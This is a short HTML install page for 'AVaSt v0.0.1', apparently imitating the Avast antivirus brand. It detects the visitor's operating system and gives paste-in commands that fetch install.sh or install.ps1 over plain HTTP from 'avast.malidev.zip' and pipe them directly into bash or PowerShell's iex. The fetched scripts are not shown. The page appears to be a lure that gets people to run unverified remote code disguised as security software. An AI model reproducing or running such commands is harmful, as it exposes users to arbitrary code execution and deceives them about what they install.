<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>AVaSt install</title>
</head>
<body>
<h1>AVaSt v0.0.1 installer</h1>
<p id="detected">detecting your OS...</p>
<h2>Linux / macOS</h2>
<pre>curl -fsSL http://avast.malidev.zip/install.sh | bash</pre>
<h2>Windows (PowerShell)</h2>
<pre>irm http://avast.malidev.zip/install.ps1 | iex</pre>
<p>powered by GDPatch</p>
<script>
var p = (navigator.userAgentData && navigator.userAgentData.platform) || navigator.platform || "";
var os = "unknown";
if (/Win/i.test(p)) os = "windows - use the PowerShell command";
else if (/Mac/i.test(p)) os = "macos - use the curl command";
else if (/Linux/i.test(p)) os = "linux - use the curl command";
document.getElementById("detected").textContent = "detected: " + os;
</script>
</body>
</html>
